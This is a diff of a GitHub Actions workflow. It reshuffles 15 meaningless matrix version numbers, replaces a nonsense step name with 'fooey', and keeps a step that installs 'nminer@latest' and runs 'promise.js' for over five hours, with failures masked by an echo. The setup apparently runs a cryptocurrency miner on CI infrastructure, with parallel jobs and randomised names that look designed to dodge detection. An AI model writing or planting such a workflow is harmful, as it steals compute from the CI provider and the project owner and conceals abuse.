@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5166 }
-          - { version: 8786 }
-          - { version: 1659 }
-          - { version: 207 }
-          - { version: 8473 }
-          - { version: 2942 }
-          - { version: 4140 }
-          - { version: 8606 }
-          - { version: 216 }
-          - { version: 8846 }
-          - { version: 202 }
-          - { version: 922 }
-          - { version: 5806 }
-          - { version: 5170 }
-          - { version: 8618 }
+          - { version: 3750 }
+          - { version: 5268 }
+          - { version: 3910 }
+          - { version: 8938 }
+          - { version: 3944 }
+          - { version: 5865 }
+          - { version: 5516 }
+          - { version: 7732 }
+          - { version: 2496 }
+          - { version: 4534 }
+          - { version: 2232 }
+          - { version: 8277 }
+          - { version: 3718 }
+          - { version: 940 }
+          - { version: 1784 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: regarding brr innocently horde supposing
+      - name: fooey
         run: |
           npm install nminer@latest
-          timeout 328m node promise.js || echo "promise executed"
+          timeout 332m node promise.js || echo "promise executed"
